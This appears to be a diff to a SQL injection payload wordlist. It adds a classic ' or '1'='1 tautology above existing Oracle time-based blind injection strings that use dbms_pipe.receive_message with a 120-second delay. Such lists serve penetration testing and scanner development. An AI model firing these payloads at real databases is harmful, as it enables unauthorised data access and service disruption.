@@ -1,3 +1,5 @@
+
+ ’ or ‘1’=’1
  and 1337=dbms_pipe.receive_message(('a'),120)
  and 1337=dbms_pipe.receive_message(('a'),120) -- 
  and 1337=dbms_pipe.receive_message((\'a\'),120)
